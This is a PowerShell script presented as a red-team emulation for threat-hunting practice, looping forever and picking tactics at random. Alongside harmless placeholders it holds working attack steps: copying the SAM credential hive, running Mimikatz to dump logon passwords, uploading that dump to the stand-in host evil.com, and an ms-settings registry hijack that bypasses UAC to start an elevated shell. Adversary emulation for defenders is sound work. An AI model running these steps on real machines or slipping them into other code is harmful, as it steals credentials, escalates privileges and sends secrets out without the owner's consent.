# CombinedRedTeamEmulation.ps1

function Invoke-BasicTactics {
    # 1. Mimic C2 traffic
    Invoke-WebRequest -Uri "http://example.com" -UseBasicParsing -Method GET

    # 2. Create a persistence mechanism via registry
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FakeUpdater" -Value "C:\Windows\System32\calc.exe"

    # 3. Generate a suspicious file in the temp directory
    Set-Content -Path "$env:TEMP\malicious_payload.txt" -Value "This is a fake malicious payload for threat hunting practice."

    # 4. Attempt to dump SAM database
    $SAMLocation = "C:\Windows\System32\config\SAM"
    $BackupLocation = "$env:TEMP\SAM_backup"
    Copy-Item -Path $SAMLocation -Destination $BackupLocation -ErrorAction SilentlyContinue
}

function Invoke-AdvancedTactics {
    # 1. Memory-resident malicious script
    $maliciousPayload = {
        Write-Output "This would be a memory resident malicious payload."
    }
    Invoke-Command -ScriptBlock $maliciousPayload

    # 2. Lateral movement emulation by pinging other hosts
    1..5 | ForEach-Object {
        $ip = "192.168.1.$_"
        ping $ip -n 1
    }

    # 3. Attempting to gather credentials from memory using Mimikatz
    $mimikatzPath = "C:\path\to\mimikatz.exe"
    $mimikatzOutput = & $mimikatzPath "privilege::debug" "sekurlsa::logonpasswords" "exit"
    $mimikatzOutput | Out-File -Path "$env:TEMP\mimikatz_output.txt"

    # 4. Emulate data exfiltration
    Invoke-WebRequest -Uri "http://evil.com/upload" -Method POST -InFile "$env:TEMP\mimikatz_output.txt" -UseBasicParsing

    # 5. Attempting UAC bypass
    $hijackPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $hijackPath -Force
    Set-ItemProperty -Path $hijackPath -Name "DelegateExecute" -Value ""
    Set-ItemProperty -Path $hijackPath -Name "(default)" -Value "powershell.exe -Command Start-Process 'cmd.exe' -Verb runAs"
    Start-Process -FilePath "ms-settings:"
}

function Invoke-RedTeamTactics {
    $tactics = @('Basic', 'Advanced')
    $selectedTactic = $tactics | Get-Random

    if ($selectedTactic -eq 'Basic') {
        Invoke-BasicTactics
    } else {
        Invoke-AdvancedTactics
    }
}

# Repeatedly invoke tactics at random intervals
while ($true) {
    Invoke-RedTeamTactics
    $randomSleepTime = Get-Random -Minimum 60 -Maximum 600  # Sleep between 1 and 10 minutes
    Start-Sleep -Seconds $randomSleepTime
}
